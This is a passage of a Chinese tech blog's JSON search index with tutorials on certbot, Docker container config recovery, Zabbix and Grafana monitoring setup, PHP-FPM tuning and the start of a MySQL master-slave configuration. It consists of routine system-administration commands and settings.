&#x2F;etc&#x2F;letsencrypt&#x2F;live&#x2F;www.example.com&#x2F;privkey.pem; ...&#125; 至此，就已经完成了生成证书到配置的全部过程了。 自动续签如果快要到期了，可以使用certbot renew对证书进行更新，需要注意的是，如果证书尚未过期，则不会更新。 可以配合conrtab使用，每半个月的凌晨三点自动续签一次。 1$ 0 3 15 * * certbot renew 参考链接 Let’s Encrypt免费SSL证书获取以及自动续签","categories":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/categories/Tutorial/"}],"tags":[{"name":"HTTPS","slug":"HTTPS","permalink":"https://www.0x2beace.com/tags/HTTPS/"},{"name":"SSL","slug":"SSL","permalink":"https://www.0x2beace.com/tags/SSL/"},{"name":"Certbot","slug":"Certbot","permalink":"https://www.0x2beace.com/tags/Certbot/"},{"name":"HTTP","slug":"HTTP","permalink":"https://www.0x2beace.com/tags/HTTP/"}]},{"title":"当 Docker 容器无法正常启动时如何修改配置文件","slug":"how-to-modify-the-configuration-file-when-the-docker-container-cannot-start-normally-1","date":"2020-09-10T13:12:13.000Z","updated":"2020-09-10T13:13:32.922Z","comments":true,"path":"how-to-modify-the-configuration-file-when-the-docker-container-cannot-start-normally-1/","link":"","permalink":"https://www.0x2beace.com/how-to-modify-the-configuration-file-when-the-docker-container-cannot-start-normally-1/","excerpt":"在容器无法正常启动的情况下，如何修改其配置文件？ 问题描述：因为错误的配置文件导致容器运行异常，无法正常启动，通常情况下只有进入容器才能修改配置文件，所以在不能进入容器的情况下该怎么办呢？","text":"在容器无法正常启动的情况下，如何修改其配置文件？ 问题描述：因为错误的配置文件导致容器运行异常，无法正常启动，通常情况下只有进入容器才能修改配置文件，所以在不能进入容器的情况下该怎么办呢？ 这种情况下，有两种方式去修改：2. Docker 容器的配置文件一般在 /var/lib/docker/overlay/目录下，可以找到该目录下对应的配置文件进行修改。2. 把容器中的配置文件复制到主机中，修改完之后，再移动到容器中。 方式一 查询日志 123456docker logs &lt;容器名称&#x2F;容器id&gt;ERROR: mysqld failed while attempting to check configcommand was: &quot;mysqld --verbose --help&quot;2020-09-03T12:15:54.644699Z 0 [ERROR] unknown variable &#39;realy-log&#x3D;slave-relay-bin&#39;2020-09-03T12:15:54.650119Z 0 [ERROR] Aborting 由于异常日志可以得知是因为我将relay-log 写成了 realy 导致容器无法正常启动。 查找文件 123456$ find &#x2F; -name mysqld.cnf&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;02e1644bc1a4dc1adc9a0300e1815f364416570d69b715fb3b7de0a06cf0c495&#x2F;diff&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;02e1644bc1a4dc1adc9a0300e1815f364416570d69b715fb3b7de0a06cf0c495&#x2F;merged&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;4f128d7fb1200f722b0d2cfe3606149fe72987a7a16bc78551a2b1fe6c6c6572&#x2F;diff&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;a68f1af4adf982b037f1bd37d61082fde1fa2b0e26ea0e2fe146edcb69b198ea&#x2F;diff&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf 这里可能会出现多个配置文件，这是因为每一次重启Mysql 容器都会保留一个配置文件，所以理论上，直接修改第一个配置文件，就是当前Mysql 所使用的配置文件。 修改配置文件 重启容器即可。 方式二如果第一种方式没生效，那可以尝试第二种方式。 复制容器中的配置文件到主机： 123# 语法：docker cp &lt;容器名称&#x2F;容器id&gt;:&lt;配置文件在容器中的路径&gt; &lt;需要复制到主机的路径&gt;$ docker cp mysql:&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf ~&#x2F;mysqld.cnf 修改主机中的配置文件 将该配置文件mv 到容器中： 123# 语法：docker cp &lt;配置文件在主机中的路径&gt; &lt;容器名称&#x2F;容器id&gt;:&lt;配置文件在容器中的路径&gt;$ docker cp ~&#x2F;mysqld.cnf mysql:&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf 重启配置文件即可。 总结：两种方式均可以有效解决上述问题，当然这类方式仅适用于容器是因错误的配置文件导致无法正常启动的情况。 参考链接 Docker修改无法启动的容器的配置文件","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"Docker","slug":"Linux/Docker","permalink":"https://www.0x2beace.com/categories/Linux/Docker/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"Docker","slug":"Docker","permalink":"https://www.0x2beace.com/tags/Docker/"}]},{"title":"Zabbix 快速上手——添加监控项","slug":"zabbix-quick-start-add-monitoring-items","date":"2020-09-09T13:50:15.000Z","updated":"2020-09-09T13:51:50.880Z","comments":true,"path":"zabbix-quick-start-add-monitoring-items/","link":"","permalink":"https://www.0x2beace.com/zabbix-quick-start-add-monitoring-items/","excerpt":"在Zabbix 默认的监控项中，唯独没有网络状态的监控，而网络状况的监控又是我最关心的，所以需要自己手动添加。 下面介绍的方式仅适合主机数量不多的情况手动添加，如果主机数量很多，使用这种方式会很繁琐低效。","text":"在Zabbix 默认的监控项中，唯独没有网络状态的监控，而网络状况的监控又是我最关心的，所以需要自己手动添加。 下面介绍的方式仅适合主机数量不多的情况手动添加，如果主机数量很多，使用这种方式会很繁琐低效。 至于更好的方式是怎样的，暂时还没有发现。 添加监控项打开Configuration-&gt;Hosts 主机页面，点击需要监控项的主机的 Application。 在Application列表中，如果没有看到 Network interfaces这一项，那么可以点击右上角的Create Appliction自己创建。 创建完成之后，items 默认是没有的，需要我们自己添加，继续点击items-&gt;create items。 接下来是最重要的一步，添加监控项的具体信息。 需要注意的地方有下面几个： Name：自定义该项监控的名称 Key：net.if.in[eth0,bytes]，其中eth0并不是固定的，这个具体的值是被监控得主机得实际网卡。 Units：bps Update interval：自动更新时间，这个可以自定义。 Applications：选择 Network interfaces 如何确定网卡地址？ 进入服务器，输入ifconfig命令查看，通常排在最前面得就是实际网卡。 完成之后，点击Add添加监控项。 如果一切顺利的话，可以在刚才添加的监控项列表中看到监控项状态是启用的。 这个时候已经可以看到该监控项相关的数据了，如果希望在Grafana 中展示，那么只需要在选择Application时，选择Network interfaces就好了。 结合Grafana，最后的效果大概是这样： 这里只是举了一个典型的例子来了解Zabbix 如何手动添加监控项，其他类型的数据也是通过类似的方式进行添加。 参考链接 zabbix监控网络的出入口流量 Cannot find information for this network interface in /proc/net/dev","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"Zabbix","slug":"Linux/Zabbix","permalink":"https://www.0x2beace.com/categories/Linux/Zabbix/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"Zabbix","slug":"Zabbix","permalink":"https://www.0x2beace.com/tags/Zabbix/"}]},{"title":"Zabbix + Grafana 打造高颜值的分布式监控平台","slug":"zabbix-grafana-to-create-a-high-value-distributed-monitoring-platform","date":"2020-09-08T13:08:25.000Z","updated":"2020-09-08T13:09:34.991Z","comments":true,"path":"zabbix-grafana-to-create-a-high-value-distributed-monitoring-platform/","link":"","permalink":"https://www.0x2beace.com/zabbix-grafana-to-create-a-high-value-distributed-monitoring-platform/","excerpt":"在前面了解了如何部署 Zabbix，众所周知Zabbix 的部署并不是难的部分，配置才是最难的那部分。 所以如何获取到想要的那部分数据，将那部分数据以更直观的方式展现出来，这才是我们更关心的。 Zabbix 默认有自己的 Graphs，但是并不好用，所以使用Zabbix + Grafana 打造高颜值的分布式监控平台才是最好的选择。","text":"在前面了解了如何部署 Zabbix，众所周知Zabbix 的部署并不是难的部分，配置才是最难的那部分。 所以如何获取到想要的那部分数据，将那部分数据以更直观的方式展现出来，这才是我们更关心的。 Zabbix 默认有自己的 Graphs，但是并不好用，所以使用Zabbix + Grafana 打造高颜值的分布式监控平台才是最好的选择。 Grafana 是什么？ Grafana是一个跨平台的开源度量分析和可是化的工具，可以通过该将采集的数据查询然后可视化的展示，并及时通知。 Grafana 有以下特点： 展示方式：快速灵活的客户端图表，面板插件有许多不同方式的可视化指标和日志，官方库中具有丰富的仪表盘插件，比如热图、折线图、图表等多种展示方式. 数据源：Graphite、InfluxDB、OpenTSDB、Prometheus、Elasticsearch、CloudWatch和KairosDb、Zabbix等。 通知提醒：以可视方式定义最重要指标的报警规则，Grafana将不断计算并发送通知，在数据达到预设阈值时通过slack，PagerDuty等处理通知。 混合展示：在同一图表中混合使用不同的数据源，可以基于每个查询指定数据源，甚至自定义数据源。 注释：使用来自不同数据源的丰富事件来展示图表，将鼠标悬停在事件上会显示完整的事件元数据和标记。 过滤器：Ad-hoc过滤器允许动态创建新的键/值过滤器，这些过滤器会自动应用于使用该数据源的所有查询。 安装Grafana 的安装还是建议根据自己实际的系统环境去官网选择适合自己的下载链接。 比如我的环境是 Ubuntu 18.04，我想安装 Grafana 7.0，所以我的安装方式应该是： 123$ sudo apt-get install -y adduser libfontconfig1$ wget https:&#x2F;&#x2F;dl.grafana.com&#x2F;oss&#x2F;release&#x2F;grafana_7.0.0_amd64.deb$ sudo dpkg -i grafana_7.0.0_amd64.deb 启动服务以守护进程的方式启动 grafana-server： 12$ sudo systemctl daemon-reload$ sudo systemctl start grafana-server 设置开机启动： 1$ sudo systemctl enable grafana-server.service 查看 grafana-server所监听的端口： 12$ sudo netstat -lntptcp6 0 0 :::3000 :::* LISTEN 17194&#x2F;grafana-serve 3000 是Grafana 默认监听端口，然后通过浏览器访问 http://your_ip_address:3000 即可。 正常应该可以看到该页面，如果你能看到3000 端口被监听，但是页面一直打不开，那可能是因为防火墙没有允许3000 端口。 默认的用户名和密码都是：admin，登录之后记得第一时间修改默认密码。 安装Zabbix 插件打开Grafana 的插件列表，找到Zabbix。 这里根据实实际情况，选择对应的版本。 通过grafana-cli 安装zabbix 插件，将下面这行代码放在安装了 Grafana 的服务器上执行： 12$ grafana-cli plugins install alexanderzobnin-zabbix-app✔ Installed alexanderzobnin-zabbix-app successfully 安装完成之后，重启Grafana： 1$ sudo systemctl restart grafana-server 然后打开Grafana 的Web 界面，在插件列表中找到 Zabbix。 点击启用。 add data source自从 Grafana 7.0 以后，没有签名的插件默认在 datasource 中是不可见的… 坑啊，最初我安装的是 Zabbix5.0，然后看见Grafana 7.0 好像只适配4.0，心想完了，该不会出现什么版本不兼容的问题吧？ 结果在add data source这一步，一直找不到 zabbix… 然后今天把5.0 完全卸载了，重新装回了4.0，结果到了add data source这一步才发现，还是找不到zabbix，当时心态就崩了… 直到我看见这篇文章，这么重要的信息，官方文档中居然没记录。 如果你无法访问，也可以直接进行修改： 1234# vim &#x2F;etc&#x2F;grafana&#x2F;grafana.ini# 添加一行allow_loading_unsigned_plugins &#x3D; alexanderzobnin-zabbix-datasource 然后重启Grafana： 1$ sudo systemctl restart grafana-server 再次打开Web 页面，现在就能找到 Zabbix 了。 配置 data source只用修改以下四个地方就好了，然后点击保存。 add dashboard依次点击add dashboard-&gt; add new panel，然后按照以下方式配置，就可以选择展示自己想要的数据了。 最后的效果： 这里只是介绍了 Zabbix + Grafana 最基础的用法，能看到的数据也是最简单的一些，如果想看到更多的数据，那就得更加了解 Zabbix 了。","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"Zabbix","slug":"Linux/Zabbix","permalink":"https://www.0x2beace.com/categories/Linux/Zabbix/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"Zabbix","slug":"Zabbix","permalink":"https://www.0x2beace.com/tags/Zabbix/"}]},{"title":"当 Docker 容器无法正常启动时如何修改配置文件？","slug":"how-to-modify-the-configuration-file-when-the-docker-container-cannot-start-normally","date":"2020-09-07T00:13:24.000Z","updated":"2020-09-07T00:14:53.536Z","comments":true,"path":"how-to-modify-the-configuration-file-when-the-docker-container-cannot-start-normally/","link":"","permalink":"https://www.0x2beace.com/how-to-modify-the-configuration-file-when-the-docker-container-cannot-start-normally/","excerpt":"在容器无法正常启动的情况下，如何修改其配置文件？","text":"在容器无法正常启动的情况下，如何修改其配置文件？ 问题描述：因为错误的配置文件导致容器运行异常，无法正常启动，通常情况下只有进入容器才能修改配置文件，所以在不能进入容器的情况下该怎么办呢？ 这种情况下，有两种方式去修改：2. Docker 容器的配置文件一般在 /var/lib/docker/overlay/目录下，可以找到该目录下对应的配置文件进行修改。2. 把容器中的配置文件复制到主机中，修改完之后，再移动到容器中。 方式一 查询日志 123456docker logs &lt;容器名称&#x2F;容器id&gt;ERROR: mysqld failed while attempting to check configcommand was: &quot;mysqld --verbose --help&quot;2020-09-03T12:15:54.644699Z 0 [ERROR] unknown variable &#39;realy-log&#x3D;slave-relay-bin&#39;2020-09-03T12:15:54.650119Z 0 [ERROR] Aborting 由于异常日志可以得知是因为我将relay-log 写成了 realy 导致容器无法正常启动。 查找文件 123456$ find &#x2F; -name mysqld.cnf&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;02e1644bc1a4dc1adc9a0300e1815f364416570d69b715fb3b7de0a06cf0c495&#x2F;diff&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;02e1644bc1a4dc1adc9a0300e1815f364416570d69b715fb3b7de0a06cf0c495&#x2F;merged&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;4f128d7fb1200f722b0d2cfe3606149fe72987a7a16bc78551a2b1fe6c6c6572&#x2F;diff&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;a68f1af4adf982b037f1bd37d61082fde1fa2b0e26ea0e2fe146edcb69b198ea&#x2F;diff&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf 这里可能会出现多个配置文件，这是因为每一次重启Mysql 容器都会保留一个配置文件，所以理论上，直接修改第一个配置文件，就是当前Mysql 所使用的配置文件。 修改配置文件 重启容器即可。 方式二如果第一种方式没生效，那可以尝试第二种方式。 复制容器中的配置文件到主机： 123# 语法：docker cp &lt;容器名称&#x2F;容器id&gt;:&lt;配置文件在容器中的路径&gt; &lt;需要复制到主机的路径&gt;$ docker cp mysql:&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf ~&#x2F;mysqld.cnf 修改主机中的配置文件 将该配置文件mv 到容器中： 123# 语法：docker cp &lt;配置文件在主机中的路径&gt; &lt;容器名称&#x2F;容器id&gt;:&lt;配置文件在容器中的路径&gt;$ docker cp ~&#x2F;mysqld.cnf mysql:&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf 重启配置文件即可。 总结：两种方式均可以有效解决上述问题，当然这类方式仅适用于容器是因错误的配置文件导致无法正常启动的情况。 参考链接 Docker修改无法启动的容器的配置文件","categories":[{"name":"Docker","slug":"Docker","permalink":"https://www.0x2beace.com/categories/Docker/"}],"tags":[{"name":"Docker","slug":"Docker","permalink":"https://www.0x2beace.com/tags/Docker/"}]},{"title":"PHP-FPM 配置初始化","slug":"php-fpm-configuration-initialization","date":"2020-09-06T03:57:11.000Z","updated":"2020-09-06T04:05:33.658Z","comments":true,"path":"php-fpm-configuration-initialization/","link":"","permalink":"https://www.0x2beace.com/php-fpm-configuration-initialization/","excerpt":"php-fpm（FastCGI Process Manger）是一个PHP FastCGI 管理器，专门和Nginx 的 ngx_fastcgi_modul模块对接，用来处理动态请求。","text":"php-fpm（FastCGI Process Manger）是一个PHP FastCGI 管理器，专门和Nginx 的 ngx_fastcgi_modul模块对接，用来处理动态请求。 初始化当安装了PHP 之后，可以从以下三个方向来对默认配置进行修改，以达到优化的效果。 1. 核心配置文件核心配置文件其实就是 php.ini，该配置文件的作用通常是用来启用或禁用第三方模块，及修改PHP 时区等。 123# vim &#x2F;usr&#x2F;local&#x2F;etc&#x2F;php&#x2F;php.inidate.timezone &#x3D; Asia&#x2F;Shanghai 2. 全局配置文件全局配置文件php-fpm.conf，通常用来配置一些辅助性功能。 123456# vim &#x2F;usr&#x2F;local&#x2F;etc&#x2F;php-fpm.conferror_log &#x3D; &#x2F;var&#x2F;log&#x2F;php-fpm&#x2F;error.loglog_level &#x3D; notice;process_max &#x3D; 0deamonize &#x3D; yes 参数解析： error_log：错误日志路径 log_level：日志级别，默认为notice alert：必须立即处理 error：错误情况 warning：警告情况 notice：一般重要信息 debug：调试信息 process_max：控制最大子进程数的全局变量，不建议设置具体数量，因为会限制扩展配置。 daemonize：是否开启守护进程，默认为yes 通常不会在php-fpm.conf中设定 process_max，因为会限制www.conf中的配置。 3. 扩展配置文件扩展配置文件www.conf通常是与php-fpm服务相关的配置，大部分优化都是需要更改这个配置文件。 123456789101112# vim &#x2F;usr&#x2F;local&#x2F;etc&#x2F;php-fpm.d&#x2F;www.conflisten &#x3D; 127.0.0.1:9000slowlog &#x3D; &#x2F;var&#x2F;log&#x2F;php-fpm&#x2F;www-slow.log# 这里按照10G 的空闲内存去设定pm &#x3D; dynamicpm.start_servers &#x3D; 16pm.max_children &#x3D; 256pm.min_spare_servers &#x3D; 16pm.max_spare_servers &#x3D; 32pm.max_requests &#x3D; 1000 参数解析： listen：有两种方式可以进行通讯。 socket：unix:/run/php/php7.3-fpm.sock http：127.0.0.1:9000 因为php-fpm与ngx_fastcgi_modul的通讯方式是 9000端口，所以默认是 127.0.0.1:9000 slowlog：慢查询日志路径 pm：进程管理方式 static：静态模式。始终保持固定数量的子进程数，配合最大子进程数一起使用，这个方式很不灵活，通常不是默认。 pm.max_children：最大子进程数。 dynamic：动态模式。按照固定的最小子进程数启动，同时用最大子进程数去限制。 pm.start_servers：默认开启的进程数 pm.min_spare_servers：最小空闲的进程数 pm.max_spare_servers：最大空闲的进程数 pm.max_children：最大子进程数 pm.max_requests：每个进程能响应的请求数量，达到此限制之后，该PHP 进程就会被自动释放掉。 nodaemonize：每个进程在闲置一定时候后就会被杀掉。 pm.max_children：最大子进程数 pm.process_idle_timeout：在多少秒之后，一个空闲的进程将会被杀死 注意：max_children 是 PHPFPM Pool 最大的子进程数，它的数值取决于服务器实际空闲内存。假设你有一台10G 运行内存的服务器，我们知道一个空闲的PHP 进程占用的是 1M 内存，而一个正在处理请求的PHP 进程 大概会占用10M-40M内存，这里按照每个PHP 请求占用 40M 内存，那么max_children = 10*1024M/40M = 256，所以这个值得根据实际环境而设定。 以上就是php-fpm 初始化配置的核心部分了。","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"PHP-FPM","slug":"PHP-FPM","permalink":"https://www.0x2beace.com/tags/PHP-FPM/"}]},{"title":"Zabbix 快速上手——部署","slug":"zabbix-quick-start","date":"2020-09-05T00:49:02.000Z","updated":"2020-09-09T13:49:09.649Z","comments":true,"path":"zabbix-quick-start/","link":"","permalink":"https://www.0x2beace.com/zabbix-quick-start/","excerpt":"因为一些特殊原因，部分环境不是搭建在云上面，而是在托管的实体机上面，这就导致原本很多云可以帮我们做的事情，现在只能自己去做了。比如：监控系统。 本着不想当运维的前端不是一个好全栈的思想，我迫切需要自己搭建一套完整的监控系统来解放自己的双手👐️。","text":"因为一些特殊原因，部分环境不是搭建在云上面，而是在托管的实体机上面，这就导致原本很多云可以帮我们做的事情，现在只能自己去做了。比如：监控系统。 本着不想当运维的前端不是一个好全栈的思想，我迫切需要自己搭建一套完整的监控系统来解放自己的双手👐️。 我希望这套监控系统是怎样的？ 免费开源 入门相对容易 支持多平台分布式监控 综合以上需求，最后我选择了 Zabbix 。 网上找了一圈，并没有发现合适的入门教程，要么是教程太老了，要么是写的不够详细，学习曲线很陡，光是部署就很费劲，而Zabbix 重要的不是部署，而是学会如何使用。 所以这篇笔记就是用来记录如何快速部署 Zabbix。 认识 ZabbixZabbix 是一个企业级的分布式开源监控方案。 一个完整的监控系统是由服务机（zabbix server）和客户机（zabbix zgent）组成，运行大概流程是这样的： zabbix agent 需要安装到被监控的主机上，它负责定期收集各项数据，并发送到 zabbix server 端，zabbix server将数据存储到自己的数据库中，zabbix web根据数据在前端进行展现和绘图。这里 agent 收集数据分为主动和被动两种模式： 主动：agent 请求server 获取主动的监控项列表，并主动将监控项内需要检测的数据提交给 server/proxy 。 被动：server 向agent请求获取监控项的数据，agent返回数据。 工作原理： 安装系统环境： Ubuntu 18.04 LTS Mysql 5.7 PHP 7.2 Nginx Zabbix 5.0 1. 安装数据库在正式安装之前，这里推荐先去官网找到符合自己的 Zabbix 服务器平台。 根据自己的实际环境来找到属于自己的下载链接，比如我是Zabbix 5.0 + Ubuntu 18.04 + Mysql + Nginx，所以我的安装方式应该是： 123$ wget https:&#x2F;&#x2F;repo.zabbix.com&#x2F;zabbix&#x2F;5.0&#x2F;ubuntu&#x2F;pool&#x2F;main&#x2F;z&#x2F;zabbix-release&#x2F;zabbix-release_5.0-1+bionic_all.deb$ dpkg -i zabbix-release_5.0-1+bionic_all.deb$ apt update 2. 安装Zabbix server，Web前端，agent1$ apt install zabbix-server-mysql zabbix-frontend-php zabbix-nginx-conf zabbix-agent Zabbix Server：用来接收并处理 Zabbix agent 传过来的数据 Web 前端：Zabbix 的交互界面 Zabbix agent：需要被监控的主机 3. 初始数据库安装完数据库之后，并不能直接登录，因为不知道root 用户的密码，所以需要重置root 用户的密码，重置的方式有多种，这里推荐我常使用的的一种。 123456# vim &#x2F;etc&#x2F;mysql&#x2F;conf.d&#x2F;mysql.conf # 也许你编辑的配置文件和我的名称不一样，不过没关系。# 添加下面两行配置[mysqld]skip-grant-tables 重启Mysql 服务： 1$ service mysql restart 现在的root 用户已经没有密码了，所以下一步要做的就是修改root 用户密码： 123$ mysql -hlocalhost -uroot -pmysql &gt; UPDATE mysql.user SET authentication_string&#x3D;PASSWORD(&#39;password&#39;), plugin&#x3D;&#39;mysql_native_password&#39; WHERE User&#x3D;&#39;root&#39; AND Host&#x3D;&#39;localhost&#39;; 然后再次修改刚才的配置文件，将下面那行配置给注释掉， 最后重启Mysql 服务就可以了。 Mysql 默认用户是root，这里不推荐直接使用 root 用户去管理 zabbix 数据库，所以还是使用官方推荐的方式，创建一个新的用户去管理： 1234567$ mysql -hlocalhost -uroot -pmysql&gt; create database zabbix character set utf8 collate utf8_bin;mysql&gt; create user zabbix@localhost identified by &#39;password&#39;;mysql&gt; grant all privileges on zabbix.* to zabbix@localhost;mysql&gt; flush privileges;mysql&gt; quit; 这里默认Mysql 是运行在本地机器上，如果Mysql 运行在容器中，而Zabbix 又运行在本机上，可能会出现一些异常（我遇到了但没能解决）。 导入初始架构和数据。 1$ zcat &#x2F;usr&#x2F;share&#x2F;doc&#x2F;zabbix-server-mysql*&#x2F;create.sql.gz | mysql -uzabbix -p zabbix 4. 配置数据库为Zabbix server配置数据库， 123# vim &#x2F;etc&#x2F;zabbix&#x2F;zabbix_server.confDBPassword&#x3D;password 5. 配置Web12345# vim &#x2F;etc&#x2F;zabbix&#x2F;nginx.conf# 去掉前面的注释，换成你自己的端口或者域名。# listen 80;# server_name example.com; 6. 配置时区123# vim &#x2F;etc&#x2F;zabbix&#x2F;php-fpm.confphp_value[date.timezone] &#x3D; Asia&#x2F;Shanghai 7. 启动服务启动Zabbix server和agent 进程，并为它们设置开机自启： 12$ systemctl restart zabbix-server zabbix-agent nginx php7.2-fpm$ systemctl enable zabbix-server zabbix-agent nginx php7.2-fpm 一切准备就绪之后，就可以访问了：http://server_ip_or_name，如果你上面配置的不是80 端口，那得记得加上对应的端口。如果你不能正常访问，那可能是因为防火墙没有允许该端口。 初次进来，需要配置相关参数，确认无误之后，点击 Next step。 Zabbix 默认的用户名和密码是Admin、zabbix，顺利登录到后台之后，记得修改默认登录密码。 配置中文语言包如果需要设置中文版的环境，需要做一些额外的配置。 1$ vim &#x2F;usr&#x2F;share&#x2F;zabbix&#x2F;include&#x2F;locales.inc.php 将zh_CN 后面参数改为 true。 如果在选择语言时，发现还是不能选择，并且提示： You are not able to choose some of the languages, because locales for them are not installed on the web server. 这是因为你系统里没中文环境，查看当前的所有系统语言环境 1$ locale -a 1. 安装中文包1apt-get install language-pack-zh-hant language-pack-zh-hans 2. 配置环境变量增加语言和编码的设置： 1234# vim &#x2F;etc&#x2F;environmentLANG&#x3D;&quot;zh_CN.UTF-8&quot;LANGUAGE&#x3D;&quot;zh_CN:zh:en_US:en&quot; 3. 替换Zabbix 语言包12345$ cd cd &#x2F;usr&#x2F;share&#x2F;zabbix&#x2F;locale&#x2F;zh_CN&#x2F;LC_MESSAGES$ wget https:&#x2F;&#x2F;github.com&#x2F;echohn&#x2F;zabbix-zh_CN&#x2F;archive&#x2F;v0.1.0.zip$ unzip master.zip$ rm frontend.mo$ cp zabbix-zh_CN-master&#x2F;frontend.mo frontend.mo 4. 解决乱码问题12345$ wget https:&#x2F;&#x2F;github.com&#x2F;chenqing&#x2F;ng-mini&#x2F;blob&#x2F;master&#x2F;font&#x2F;msyh.ttf$ vim &#x2F;usr&#x2F;share&#x2F;zabbix&#x2F;include&#x2F;defines.inc.php# 找到 define(&#39;ZBX_GRAPH_FONT_NAME&#39;, &#39;graphfont&#39;);# 将graphfont 替换成 msyh 5. 更新mibs 库1$ apt-get install snmp-mibs-downloader 6. 重启服务1$ systemctl restart zabbix-server zabbix-agent php7.2-fpm 至此Zabbix 的完整部署过程就全介绍完了。 参考链接 Zabbix 3.0 for Ubuntu 14.04 LTS 安装 下载安装Zabbix——Zabbix 官网 企业级分布式监控系统–zabbix","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"Zabbix","slug":"Linux/Zabbix","permalink":"https://www.0x2beace.com/categories/Linux/Zabbix/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"Zabbix","slug":"Zabbix","permalink":"https://www.0x2beace.com/tags/Zabbix/"},{"name":"监控系统","slug":"监控系统","permalink":"https://www.0x2beace.com/tags/%E7%9B%91%E6%8E%A7%E7%B3%BB%E7%BB%9F/"}]},{"title":"Zabbix 快速上手——添加Agent 主机","slug":"zabbix-add-agent-host","date":"2020-09-04T13:48:16.000Z","updated":"2020-09-08T13:03:21.864Z","comments":true,"path":"zabbix-add-agent-host/","link":"","permalink":"https://www.0x2beace.com/zabbix-add-agent-host/","excerpt":"Zabbix-Server 安装完成之后，下一步需要添加主机才能看到数据。","text":"Zabbix-Server 安装完成之后，下一步需要添加主机才能看到数据。 安装Zabbix AgentZabbix Agent 的作用是将服务器的数据发送给 Zabbix Server，所以只需要在需要监控的主机上安装 Zabbix Agent 就够了。 因为我的环境是：Ubuntu 18.04、Nginx、Mysql、PHP，根据官网的选择对应的下载链接。 在有了Mysql 和 Nginx的情况下，这里我只选择安装 Zabbix Agent，如果没有的话，那就需要额外安装zabbix-mysql、zabbix-nginx-conf、zabbix-frontend-php。 1234$ wget https:&#x2F;&#x2F;repo.zabbix.com&#x2F;zabbix&#x2F;5.0&#x2F;ubuntu&#x2F;pool&#x2F;main&#x2F;z&#x2F;zabbix-release&#x2F;zabbix-release_5.0-1+bionic_all.deb$ dpkg -i zabbix-release_5.0-1+bionic_all.deb$ apt update$ apt install zabbix-agent 配置 Zabbix Agent12345# vim &#x2F;etc&#x2F;zabbix&#x2F;zabbix_agentd.confServer：Zabbix Server 的IP 地址ServerActive：Zabbix Server 的IP 地址Hostname：Zabbix Agent 这台主机的别名 核心的配置只有这三行，改完之后，重启以下 Zabbix Agent。 1$ systemctl restart zabbix-agent 添加主机完成以上配置之后，下一步需要做的就是打开 Zabbix 的Web 端，开始添加主机。 配置主机基础信息： 主机名称：zabbix_agentd.conf 中的Hostname 客户端IP：需要监控的主机的IP 地址 端口默认使用 10050 配置模版： 需要注意的是，如果没有配置模版，可能会导致没有数据。 然后点击添加即可。 打开监控面板，点击主机，正常情况下，主机状态应该是这样的。 至此就完成了Agent 的添加，点击最新数据或者图形可以看到相应的数据。 参考链接 安装zabbix-agent并添加到zabbix web中监控 Zabbix 使用 Zabbix-Agent 添加新的Linux服务器监控","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"Zabbix","slug":"Linux/Zabbix","permalink":"https://www.0x2beace.com/categories/Linux/Zabbix/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"Zabbix","slug":"Zabbix","permalink":"https://www.0x2beace.com/tags/Zabbix/"}]},{"title":"Mysql 主从架构配置","slug":"mysql-master-slave-architecture-configuration","date":"2020-09-03T15:40:16.000Z","updated":"2020-09-03T15:43:51.804Z","comments":true,"path":"mysql-master-slave-architecture-configuration/","link":"","permalink":"https://www.0x2beace.com/mysql-master-slave-architecture-configuration/","excerpt":"Mysql 主从配置是数据库同步的必要步骤。","text":"Mysql 主从配置是数据库同步的必要步骤。 主机环境： Ubuntu 18.04 LTS Mysql 5.7 下面会将主数据库简称为Master，从数据库简称为 Slave。 配置Master1234567# vim &#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf# 